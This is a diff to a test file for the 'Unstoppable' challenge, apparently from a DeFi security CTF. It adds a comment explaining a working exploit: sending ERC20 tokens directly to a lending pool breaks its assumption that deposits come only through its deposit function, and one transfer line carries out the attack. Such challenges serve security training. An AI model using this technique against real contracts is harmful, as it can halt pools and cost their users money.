@@ -39,8 +39,22 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
+
+    /** CODE YOUR EXPLOIT HERE */
+        /**
+        * Exploit Overview
+        * 
+        * @dev
+        * 
+        * The problem is that the pool assumes that the only way to transfer tokens to it
+        * is via its deposit function.
+        * 
+        * We just use the transfer function from the ERC20 contracts.
+        * 
+        * You can find the contracts I wrote on /contracts/attacker-contracts
+        */
         await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('100'))
-        /** CODE YOUR EXPLOIT HERE */
+        
     });
 
     after(async function () {
